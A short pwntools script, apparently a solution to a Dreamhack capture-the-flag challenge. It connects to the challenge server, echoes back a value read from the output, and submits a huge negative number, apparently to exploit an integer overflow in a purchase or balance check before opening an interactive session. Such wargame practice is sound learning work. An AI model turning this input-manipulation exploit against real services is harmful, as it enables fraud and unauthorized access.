from pwn import *

p = remote('host3.dreamhack.games', 19031)
p.sendline(b'2')
p.recvuntil(b'"')
robot=p.recvline()[0:-2]
#p.recvuntil(b'>')
p.sendline(robot)
#p.recvuntil(b'>')
p.sendline(b'1')
#p.recvuntil(b'?')
p.sendline(b'-1000000000000000000000000000000')
#p.recvuntil(b'>')
p.sendline(b'7')
#p.recvuntil(b'>')
p.sendline(b'3')
p.interactive()